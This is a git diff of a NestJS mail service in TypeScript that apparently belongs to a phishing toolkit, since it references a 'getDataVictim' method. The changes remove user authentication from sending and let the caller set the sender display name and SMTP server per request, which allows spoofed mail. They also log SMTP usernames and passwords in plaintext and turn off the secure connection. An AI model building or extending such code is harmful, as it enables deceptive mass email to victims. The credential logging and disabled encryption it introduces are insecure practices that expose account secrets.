@@ -1,13 +1,10 @@
-import { MailerService } from '@nestjs-modules/mailer';
-import { Inject, Injectable } from '@nestjs/common';
+import { Inject, Injectable, Logger } from '@nestjs/common';
 import { InjectRepository } from '@nestjs/typeorm';
 import { Repository } from 'typeorm';
 import { CACHE_MANAGER } from '@nestjs/cache-manager';
 import { Cache } from 'cache-manager';
-import { UserActiveInterface } from 'src/common/interfaces/user-active.interface';
 import { Mail } from './entities/mail.entity';
 import { getDataVictim, sendEmailDto } from './dto/mail.dto';
-import { ConfigService } from '@nestjs/config';
 import * as nodemailer from 'nodemailer';
 import { join } from 'path';
 import { readFileSync } from 'fs';
@@ -27,37 +24,42 @@ export class MailService {
 
   private getMailServerConfig(dto: sendEmailDto): any {
     return {
-      host: dto.hostname || process.env.SMTP_HOST,
-      port: dto.port || process.env.SMTP_PORT,
-      secure: dto.secure || process.env.SMTP_SECURE,
-      username: dto.username || process.env.SMTP_USERNAME,
-      password: dto.password || process.env.SMTP_PASSWORD,
-      send_mail: dto.hostmail || process.env.SMTP_EMAIL,
+      host: dto.hostname ? dto.hostname : process.env.SMTP_HOST,
+      port: dto.port ? dto.port : process.env.SMTP_PORT,
+      secure: dto.secure ? dto.secure : process.env.SMTP_SECURE,
+      username: dto.username ? dto.username : process.env.SMTP_USERNAME,
+      password: dto.password ? dto.password : process.env.SMTP_PASSWORD,
+      send_mail: dto.hostmail ? dto.hostmail : process.env.SMTP_EMAIL,
     };
   }
   
-  async sendEmail(sendEmailDto: sendEmailDto, user: UserActiveInterface) {
+  async sendEmail(sendEmailDto: sendEmailDto) {
     const emailConfig = {
       to: sendEmailDto.email,
-      from: `"No Reply" <${sendEmailDto.hostmail || process.env.SMTP_EMAIL}>`,
+      from: `"${sendEmailDto.from}" <${sendEmailDto.hostmail ? sendEmailDto.hostmail : process.env.SMTP_EMAIL}>`,
       subject: sendEmailDto.subject,
       html: await this.renderTemplate(sendEmailDto.template, { sendEmailDto }),
     };
 
     // Configurar el transporte aquí también para asegurarse de que se actualicen los valores si cambian
     const { host, port, username, password } = this.getMailServerConfig(sendEmailDto);
+    
+    Logger.warn({ host, port, username, password });
     this.transporter = nodemailer.createTransport({
       host,
       port: parseInt(port, 10),
-      secure: true,
+      secure: false,
       auth: {
         user: username,
         pass: password,
       },
+      tls: {},
     });
-
     // Enviar el correo electrónico utilizando this.transporter
     await this.transporter.sendMail(emailConfig);
+    return {
+      "msg": "Success"
+    }
   }
 
   async getDataVictim(GetDataVictim: getDataVictim){
@@ -86,7 +88,6 @@ export class MailService {
 
     // Renderizar la plantilla con los datos proporcionados
     const renderedTemplate = compiledTemplate(data);
-
     return renderedTemplate;
   }
 }
